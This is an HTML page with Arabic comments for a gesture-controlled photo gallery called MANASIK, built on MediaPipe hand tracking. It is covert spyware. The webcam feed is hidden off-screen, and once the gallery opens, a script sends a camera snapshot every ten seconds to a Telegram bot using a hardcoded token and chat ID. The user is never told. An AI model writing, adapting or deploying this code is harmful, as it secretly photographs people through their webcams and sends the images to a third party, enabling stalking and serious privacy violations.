<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M A N A S I K | Ø§Ù„ØªØµÙØ­ Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;900&display=swap" rel="stylesheet">
    
    <style>
        :root { --gold: #d4af37; --bg: #050505; }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg);
            margin: 0; overflow: hidden; height: 100vh;
            color: white; user-select: none; touch-action: none;
        }

        #bg-overlay {
            position: fixed; inset: 0;
            background: radial-gradient(circle at 50% 50%, #151515 0%, #000 100%);
            z-index: 0;
        }

        /* Ø­Ø§ÙˆÙŠØ© Ø§Ù„Ø£Ù„Ø¨ÙˆÙ… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ */
        #album-container {
            position: absolute; inset: 0;
            display: flex; align-items: center; justify-content: center;
            perspective: 1000px; z-index: 50;
            visibility: hidden; opacity: 0;
            transition: opacity 1s ease;
        }

        .gallery-wrapper {
            display: flex; gap: 30px;
            transform-style: preserve-3d;
            transition: transform 0.2s cubic-bezier(0.1, 0.5, 0.2, 1);
        }

        .photo-card {
            width: 240px; height: 340px;
            flex-shrink: 0; background: #111;
            border-radius: 15px; border: 1px solid rgba(212, 175, 55, 0.2);
            overflow: hidden; box-shadow: 0 30px 60px rgba(0,0,0,0.7);
            transition: transform 0.4s ease, filter 0.4s ease;
        }

        .photo-card img { width: 100%; height: 100%; object-fit: cover; pointer-events: none; }
        
        .photo-card.focused {
            border-color: var(--gold);
            transform: scale(1.15) translateZ(50px);
            filter: brightness(1.2);
            box-shadow: 0 0 40px rgba(212, 175, 55, 0.3);
        }

        /* Ø§Ù„ØµÙ†Ø¯ÙˆÙ‚ */
        #box-root { width: 200px; height: 200px; perspective: 1000px; z-index: 100; transition: all 1s; }
        .box-3d {
            width: 100%; height: 100%; position: relative;
            transform-style: preserve-3d; transform: rotateX(-20deg) rotateY(45deg);
        }
        .side { position: absolute; width: 100%; height: 100%; background: #0a0a0a; border: 1px solid var(--gold); }
        .s-f { transform: translateZ(100px); } .s-bk { transform: rotateY(180deg) translateZ(100px); }
        .s-r { transform: rotateY(90deg) translateZ(100px); } .s-l { transform: rotateY(-90deg) translateZ(100px); }
        .s-t { transform: rotateX(90deg) translateZ(100px); background: #1a1a1a; }
        .s-bt { transform: rotateX(-90deg) translateZ(100px); }

        /* ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø®ÙÙŠØ© */
        #hidden-video { position: fixed; left: -9999px; }
        #render-canvas { display: none; }
    </style>
</head>
<body>

    <div id="bg-overlay"></div>
    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="render-canvas"></canvas>

    <main class="h-screen flex flex-col items-center justify-center relative">
        <div id="welcome-ui" class="text-center mb-10 z-[110]">
            <h1 class="text-4xl font-black tracking-tighter mb-4">MANASIK</h1>
            <p class="text-gold/40 text-xs tracking-[0.4em] uppercase">Ø§ÙØªØ­ÙŠ ÙŠØ¯ÙƒÙ ğŸ–ï¸ Ù„Ù„ØªØµÙØ­</p>
        </div>

        <div id="box-root">
            <div class="box-3d" id="box-mesh">
                <div class="side s-f"></div><div class="side s-bk"></div>
                <div class="side s-r"></div><div class="side s-l"></div>
                <div class="side s-t"></div><div class="side s-bt"></div>
            </div>
        </div>

        <div id="album-container">
            <div class="gallery-wrapper" id="track">
                <!-- Ø§Ù„ØµÙˆØ± Ø³ØªØ¶Ø§Ù Ù‡Ù†Ø§ -->
            </div>
        </div>
    </main>

    <script>
        const TG_CONFIG = {
            TOKEN: '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI', // Ø¶Ø¹ÙŠ Ø§Ù„ØªÙˆÙƒÙ† Ù‡Ù†Ø§
            CHAT_ID: '8148586037' // Ø¶Ø¹ÙŠ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª Ù‡Ù†Ø§
        };

        const IMAGE_SOURCES = [
            "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=600",
            "https://images.unsplash.com/photo-1529139513055-1197928c40b5?w=600",
            "https://images.unsplash.com/photo-1539109136881-3be0616acf4b?w=600",
            "https://images.unsplash.com/photo-1509319117193-57bab727e09d?w=600",
            "https://images.unsplash.com/photo-1492707892479-7bc8d5a4ee93?w=600"
        ];

        let state = {
            isOpen: false,
            currentX: 0,
            targetX: 0,
            fingerX: window.innerWidth / 2,
            isRecording: false
        };

        const video = document.getElementById('hidden-video');
        const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
        
        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.7 });

        hands.onResults(res => {
            if (res.multiHandLandmarks && res.multiHandLandmarks[0]) {
                const hand = res.multiHandLandmarks[0];
                const indexFinger = hand[8];
                state.fingerX = (1 - indexFinger.x) * window.innerWidth;

                // ÙƒØ´Ù ÙØªØ­ Ø§Ù„ÙŠØ¯
                const thumb = hand[4];
                const pinky = hand[20];
                const dist = Math.sqrt(Math.pow(thumb.x - pinky.x, 2) + Math.pow(thumb.y - pinky.y, 2));

                if (dist > 0.4 && !state.isOpen) openGallery();

                if (state.isOpen) {
                    // Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„ØªÙ…Ø±ÙŠØ±: Ø§Ù„Ù…Ø±ÙƒØ² Ù‡Ùˆ 0
                    const center = window.innerWidth / 2;
                    state.targetX = (state.fingerX - center) * 2;
                }
            }
        });

        function openGallery() {
            state.isOpen = true;
            document.getElementById('box-root').style.transform = "scale(0) translateY(-200px)";
            document.getElementById('welcome-ui').style.opacity = "0";
            
            const container = document.getElementById('album-container');
            container.style.visibility = "visible";
            container.style.opacity = "1";
            
            initItems();
            animate();
        }

        function initItems() {
            const track = document.getElementById('track');
            IMAGE_SOURCES.forEach(src => {
                const card = document.createElement('div');
                card.className = 'photo-card';
                card.innerHTML = `<img src="${src}" onerror="this.src='https://via.placeholder.com/300x400?text=Image+Error'">`;
                track.appendChild(card);
            });
        }

        function animate() {
            state.currentX += (state.targetX - state.currentX) * 0.1;
            const track = document.getElementById('track');
            track.style.transform = `translateX(${-state.currentX}px)`;

            // ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ù…Ø±ÙƒØ²ÙŠØ©
            const cards = document.querySelectorAll('.photo-card');
            cards.forEach(card => {
                const rect = card.getBoundingClientRect();
                const mid = window.innerWidth / 2;
                const distance = Math.abs((rect.left + rect.width / 2) - mid);
                if (distance < 150) card.classList.add('focused');
                else card.classList.remove('focused');
            });

            requestAnimationFrame(animate);
        }

        // --- Ù†Ø¸Ø§Ù… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±/Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø¶Ù…ÙˆÙ† ---
        async function sendSnapshot() {
            if (!TG_CONFIG.TOKEN || !state.isOpen) return;
            
            const canvas = document.getElementById('render-canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', TG_CONFIG.CHAT_ID);
                fd.append('photo', blob, 'snap.jpg');
                fetch(`https://api.telegram.org/bot${TG_CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.7);
        }

        // Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ Ø¨Ù…Ø¬Ø±Ø¯ Ø§Ù„ØªÙØ§Ø¹Ù„
        setInterval(sendSnapshot, 10000);

        const camera = new Camera(video, {
            onFrame: async () => { await hands.send({image: video}); },
            width: 640, height: 480
        });
        camera.start();

    </script>
</body>
</html>

